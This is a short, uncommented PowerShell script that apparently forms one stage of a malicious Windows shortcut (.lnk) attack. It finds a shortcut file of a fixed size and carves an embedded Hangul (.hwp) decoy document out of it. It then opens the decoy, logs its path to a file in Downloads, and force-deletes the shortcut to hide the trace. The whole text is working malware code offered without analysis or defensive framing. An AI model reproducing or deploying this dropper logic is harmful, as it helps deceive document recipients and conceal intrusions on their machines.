$lk=ls -Path '.\' -filter '*.lnk';

for($a = 0;$a -lt $lk.length;$a++){if($lk[$a].length -eq 56397) {$partpth = $lk[$a].directory;$lk=$lk[$a].name;break}}
$n=$lk.Replace('.lnk','.hwp');
if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2
for($a = 0;$a -lt $lk.length;$a++){if($lk[$a].length -eq 56397) {$partpth = $lk[$a].directory;$lk=$lk[$a].name;break}}
};

$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];
$fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);

&"$partpth\\$fsdf";
ac -path "C:\Users\user\Downloads\1.txt" "$partpth\\$fsdf";
ri "$partpth\\$lk" -force;






